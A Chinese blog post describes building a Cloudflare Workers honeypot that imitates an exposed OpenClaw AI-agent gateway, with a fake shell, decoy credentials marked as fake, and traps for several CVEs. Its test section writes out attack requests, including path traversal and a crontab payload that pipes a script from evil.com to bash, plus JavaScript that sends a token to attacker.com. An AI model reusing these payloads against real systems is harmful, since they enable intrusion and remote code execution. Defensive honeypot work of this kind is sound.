# 我用 Cloudflare Workers 搭了一个 OpenClaw 蜜罐

> 部署地址：gateway.example.com

---

今年开头，OpenClaw（大家叫它"龙虾"）突然火了，GitHub 星标一下子冲到25万，国内外各种技术群都在讨论。这东西简单说就是让 AI 能真正干活——发邮件、写代码、操控智能家居，不只是聊天。

热度这么高，公网暴露的实例自然也跟着多起来。FOFA 搜 `app="openclaw"` 能找到12万多个，工信部也专门出了安全预警，说已经有150万条 Agent 凭证被泄露。更扎眼的是，好几个高危 CVE 已经有在野利用了。

所以我寻思着，用它做个蜜罐挺合适的——知名度高、攻击面大、漏洞多，攻击者有动力来扫，也有现成的 payload 可以用。

---

## 为什么选 Cloudflare Workers

这个问题其实一开始我也没想太多，主要是手边没有闲置服务器，Workers 免费，就试了一下。

用下来发现比自建服务器省事不少：

- 不用操心扫描流量太大把机器打挂，边缘节点自动抗
- `request.cf` 对象直接给你 IP 的国家、城市、ASN、`threatScore`（0-100 的威胁评分），省掉了 MaxMind 之类的数据库
- D1 数据库直接绑定，SQLite 接口，不需要额外搭存储
- 免费额度每天10万请求，够用

唯一的坑：Cloudflare 自己的 WAF 和 Bot Fight Mode 会在流量到达 Worker 之前就把攻击请求拦掉，蜜罐就什么都记录不到了。需要在 Dashboard 里手动关一些安全规则，后面部署那块会说。

---

## 蜜罐长什么样

访问 `gateway.example.com` 看到的是一个完整的 OpenClaw v2026.3.12 控制台，有7个标签页：

| 标签 | 内容 |
|---|---|
| Overview | 通道状态（5个都显示 connected）、API 端点列表、安全公告 |
| Chat | 5组伪造的对话记录，带工具调用日志 |
| Sessions | 会话详情，有 token 用量和费用 |
| Config | 配置文件预览，API Key 脱敏显示 |
| Logs | 网关启动日志 |
| Terminal | 可以真正交互的假 Shell |
| Skills | 14个已安装技能 |

HTTP 头也按真实 OpenClaw 的指纹来：

```http
X-OpenClaw-Version: 2026.3.12
X-Powered-By: OpenClaw/2026.3.12
```

这样 FOFA 能正常收录，扫描器能识别出目标类型。

---

## 假文件系统和假 Shell

这部分花了不少时间。光是返回一个 API 响应还不够，真正让攻击者信的，是能在里面"翻到东西"。

假文件系统里放了这些：

```
/root/.bash_history        命令历史，里面有 mysql 连接命令和明文密码
/root/.ssh/id_rsa          完整格式的假 SSH 私钥
/root/.openclaw/openclaw.json  配置文件，含 API Key 和 gateway token
/root/config.json          数据库连接配置
/root/customers.db         伪造的客户数据，247条记录
/etc/passwd                标准格式
```

Terminal 标签页里的 Shell 支持真实执行：

```bash
$ docker ps
CONTAINER ID   IMAGE                   STATUS        PORTS
a3f2e1b9c4d8   openclaw/gateway:latest Up 13 hours   0.0.0.0:18789->18789/tcp

$ docker inspect openclaw_gateway
# 返回完整的容器 JSON，环境变量里有 API Key

$ kubectl get pods
$ crontab -l
$ env   # 包含所有假凭证
```

每条命令都有对应的假输出，命令执行还加了80-200ms 的随机延迟，不然响应太快会显得很假。

---

## CVE 陷阱

这是整个蜜罐最核心的部分。OpenClaw 的漏洞库里现在有82个已披露漏洞，我从里面选了7个最容易被武器化的做成陷阱：

| CVE | 利用方式 | 蜜罐行为 |
|---|---|---|
| CVE-2026-25253 | `?gatewayUrl=攻击者地址` | 返回 HTML，里面的 JS 自动把 token 发到攻击者服务器 |
| GHSA-rchv-x836-w7xp | 访问仪表盘 | JS 把 token 和 API Key 写入 localStorage，F12 可直接读 |
| CVE-2026-28464 | `?sessionId=../../etc/passwd` | 按路径返回对应的假文件内容 |
| CVE-2026-32060 | `POST /api/v1/agent/apply_patch` | 接受任意路径，返回写入成功 |
| CVE-2026-28470 | `POST /api/v1/exec/execute` | 执行假命令，返回真实格式的输出 |
| CVE-2026-26319 | `POST /webhooks/telnyx` | 无需认证，任何事件都接受 |
| GHSA-6mgf-v5j7-45cr | `GET /api/v1/gateway/fetch?url=` | 模拟 SSRF，返回"Authorization 头已转发"的响应 |

CVE-2026-25253 是其中最值得说的。真实漏洞是：OpenClaw 控制台会用 `?gatewayUrl=` 参数里的地址建立 WebSocket 连接，并把认证 token 直接发过去，没有域名校验。已经有在野利用了。

蜜罐的实现是这样的——访问 `/?gatewayUrl=http://attacker.com/collect` 时，返回一个包含这段 JS 的页面：

```javascript
var ws = new WebSocket('ws://attacker.com/collect?token=ocgw-demo-token...');
ws.onopen = function(){
  ws.send(JSON.stringify({
    type: 'auth',
    token: 'ocgw-demo-token-not-real',
    version: '2026.3.12',
    gateway_id: 'demo-gateway-01'
  }));
};
// 如果 WebSocket 失败，fallback 到 fetch POST
```

攻击者的接收端会收到一个完整的 token，以为 exploit 成功了。

---

## robots.txt 的小心机

```
User-agent: *
Disallow: /api/
Disallow: /.openclaw/
Disallow: /.env
Disallow: /webhooks/

# Sensitive endpoints (do not crawl):
# /api/v1/keys
# /api/v1/shell/execute
# /api/v1/agent/memory/export
# /api/v1/exec/execute
# /api/v1/agent/apply_patch
# /.openclaw/openclaw.json
```

`Disallow` 指令是给爬虫看的，加上之后对某些扫描器有引导效果；注释里列的具体端点路径，主要是给人工渗透测试者做信息收集用的——打开 robots.txt 翻一翻是标准操作，注释里把最有价值的端点都写清楚了，相当于指路。

---

## 测试记录

以下是部署后的测试，模拟攻击者视角验证各陷阱正常工作。

### 敏感文件探测

```bash
$ curl https://gateway.example.com/.env

SHELL=/bin/bash
ANTHROPIC_API_KEY=sk-ant-example-not-a-real-key
OPENAI_API_KEY=sk-proj-example-not-a-real-key
OPENCLAW_GATEWAY_TOKEN=ocgw-demo-token-not-real
DB_HOST=db.internal.example
DB_PASSWORD=demo-db-password
REDIS_PASSWORD=demo-redis-password
```

```bash
$ curl https://gateway.example.com/.ssh/id_rsa

DEMO_PRIVATE_KEY_START_NOT_REAL\nDEMO-KEY-MATERIAL-NOT-REAL\nDEMO_PRIVATE_KEY_END_NOT_REAL
```

拿到这些"凭证"之后，攻击者通常会去尝试连数据库、调 Anthropic API、SSH 进内网，每一步都还是陷阱。

### Shell 执行

```bash
$ curl -X POST https://gateway.example.com/api/v1/shell/execute \
  -H "Content-Type: application/json" \
  -d '{"cmd":"cat /root/.openclaw/openclaw.json"}'

{
  "stdout": "{\"anthropicApiKey\":\"sk-ant-api03-...\",\"gateway\":{\"auth\":{\"token\":\"ocgw-...\"}}}",
  "exit_code": 0,
  "session": "main"
}
```

```bash
$ curl -X POST https://gateway.example.com/api/v1/shell/execute \
  -d '{"cmd":"docker inspect openclaw_gateway"}'

"Env": [
  "ANTHROPIC_API_KEY=sk-ant-example...",
  "OPENCLAW_GATEWAY_TOKEN=ocgw-demo-token..."
]
```

### CVE-2026-28464 路径穿越

```bash
$ curl "https://gateway.example.com/api/v1/sessions?sessionId=../../etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
openclaw:x:1000:1000:OpenClaw User:/home/openclaw:/bin/bash
```

### CVE-2026-32060 apply_patch 任意写

```bash
$ curl -X POST https://gateway.example.com/api/v1/agent/apply_patch \
  -d '{"path":"../../../etc/crontab","content":"* * * * * curl evil.com/s.sh|bash"}'

{
  "status": "ok",
  "applied": true,
  "path": "../../../etc/crontab",
  "backup": "../../../etc/crontab.bak.1773581391668",
  "message": "Patch applied successfully."
}
```

攻击者以为在服务器 crontab 里写进了反弹 Shell，实际什么都没发生。

### Agent Memory 导出

```bash
$ curl https://gateway.example.com/api/v1/agent/memory/export

{
  "memory": [
    {"type":"credential","content":"ANTHROPIC_API_KEY=sk-ant-api03-..."},
    {"type":"credential","content":"DB_PASSWORD=demo-db-password  DB_HOST=db.internal.example"},
    {"type":"credential","content":"REDIS_PASSWORD=demo-redis-password"},
    {"type":"context","content":"Synthetic billing profile: routing=000000000 account=DEMO-ACCOUNT-NOT-REAL"}
  ]
}
```

AI 的"记忆"里放了一堆凭证，还有伪造的银行账户。这个端点是专门为了让攻击者觉得"挖到金矿了"设计的。

---

## 管理后台

`/admin` 后台记录每一条请求，表格里可以看到：

- **IP + 威胁评分**：Cloudflare `cf.threatScore`，超过50的红色标注
- **城市/省份/国家**：来自 `request.cf`，不用查库
- **攻击类型**：自动分类，包括 SQL 注入、命令注入、各 CVE 尝试、`STOLEN_TOKEN_USE`（攻击者真的拿着蜜罐泄露的假 token 来请求，CRITICAL 级别）
- **完整请求头**：保存所有 header，可以看到攻击者用的工具

鼠标悬浮在被截断的字段上（Location、Path、UA）会弹出完整内容，不用来回跳页面。

---

## 部署步骤

```bash
# 1. 创建 D1 数据库
npx wrangler d1 create openclaw-honeypot
# 把返回的 database_id 填进 wrangler.toml

# 2. 初始化表结构
npx wrangler d1 execute openclaw-honeypot --remote --file=schema.sql

# 3. 设置管理密码
npx wrangler secret put ADMIN_PASSWORD

# 4. 部署
npm run deploy
```

wrangler.toml 里配置路由：

```toml
[[routes]]
pattern = "your-domain.com/*"
zone_name = "your-domain.com"
```

**Cloudflare Dashboard 里需要手动处理的（否则大量攻击流量会被 CF 在到达 Worker 之前拦掉）：**

免费计划没有 WAF Managed Rules，这块不用管。主要处理两项：

1. **Security Level** → `Essentially Off`（全区域设置，会影响整个 zone）
2. **Bot Fight Mode** → 在 WAF > Custom Rules 里加一条 Skip 规则，匹配 `Hostname equals your-honeypot-domain.com`，这样只对蜜罐域名关闭，不影响其他子域名

另外建议加一条 Cache Rule 对蜜罐域名设置 Bypass，确保每个请求都到 Worker 走一遍记录，不会被缓存掉。

---

## 查看日志

```bash
# 实时追踪
npx wrangler tail

# 管理后台
https://your-domain.com/admin
```

---

就这些，整个项目就一个 JS 文件加一个 SQL 文件，部署完全在 Cloudflare 上，没有服务器要维护。

---

## 开源地址

代码已开源，含完整部署文档：

**[https://github.com/stephenlzc/workers-honeypot](https://github.com/stephenlzc/workers-honeypot)**

---

*部署地址：gateway.example.com*
